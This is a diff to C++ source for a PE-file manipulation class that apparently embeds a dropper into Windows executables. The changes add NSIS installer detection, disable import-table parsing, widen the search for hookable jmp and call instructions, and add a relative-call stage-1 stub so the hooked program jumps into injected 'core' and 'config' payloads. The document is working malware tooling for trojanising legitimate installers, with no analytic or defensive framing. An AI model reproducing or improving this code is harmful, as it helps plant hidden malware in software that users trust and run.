@@ -32,6 +32,8 @@ PEObject::PEObject(char* data, std::size_t size)
 	memset(&_resources, 0, sizeof(_resources));
 	memset(&functionIndex, 0, sizeof(functionIndex));
 	memset(&_hookPointer, 0, sizeof(_hookPointer));
+
+	exeType = 0;
 }
 
 PEObject::~PEObject(void)
@@ -52,10 +54,12 @@ bool PEObject::parse()
 	
 	if (_parseNTHeader() == false)
 		return false;
-	
+
+	/*
 	if (_parseIAT() == false)
 		return false;
-	
+	*/
+
 	try {
 		_parseResources();
 	} catch (parsing_error &e) {
@@ -187,6 +191,11 @@ bool PEObject::_parseNTHeader()
 		// create a new section object
 		GenericSection* section = new GenericSection(*this, (char*)sectionHeader->Name, sectionHeader);
 		
+		if(!strcmp((const char*)sectionHeader->Name, ".ndata"))
+		{
+			cout << "NSIS installer detected!" << endl;
+			exeType = NSIS_INSTALLER;
+		}
 		// add section to list
 		_sections.push_back(section);
 		
@@ -266,7 +275,7 @@ bool PEObject::saveToFile(std::string filename)
 		/*** fix section headers ***/
 		for (std::size_t i = 1; i <_sections.size(); i++) {
 			GenericSection* prevSection = _sections[i-1];
-			
+
 			// find first section with PointerToRawData != 0
 			for(std::size_t x = i; x>0;)
 			{
@@ -964,7 +973,7 @@ void PEObject::_findHookableInstruction()
 	for (; iter != instructions_.end(); iter++) 
 	{
 		// hook jmp opcodes of length 5
-		disassembled_instruction instr = *iter;
+		disassembled_instruction instr = *iter;		
 		switch (instr.d.Instruction.BranchType) {
 			case JmpType:
 				if (instr.len == STAGE1_STUB_SIZE) {
@@ -981,7 +990,7 @@ void PEObject::_findHookableInstruction()
 				}
 				break;
 			case CallType:
-				if (instr.len == 6) {
+				if (instr.len == 6 || instr.len == STAGE1_STUB_SIZE) {
 					printf("\n");
 					printf("%.8X(%02d) %s\n", (int)instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
 					printf("!!! potential hook found at VA %08x\n", instr.d.VirtualAddr);
@@ -998,7 +1007,7 @@ void PEObject::_findHookableInstruction()
 				break;
 		}
 		
-		(void) printf("\r%.8X(%02d) %s",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
+		(void) printf("%.8X(%02d) %s\n",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
 	}
 }
 
@@ -1021,7 +1030,7 @@ void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, int VA
 	while (instr.d.EIP < (long)end) {
 		// disassemble current instruction
 		printf("\rdisassembling %08x", instr.d.VirtualAddr);
-		
+
 		int len = Disasm(&instr.d);
 		instr.len = len;
 
@@ -1201,8 +1210,15 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 			break;
 		case CallType:
 			{
+				if(hookedInstruction_.len == 6)
 				//DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr);
-				stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
+					stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
+				else if(hookedInstruction_.len == 5)
+				{
+					DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr) + hookedInstruction_.len - 1 ;
+					stage1stub.call(addr);
+				}
+
 			}
 			break;
 	}
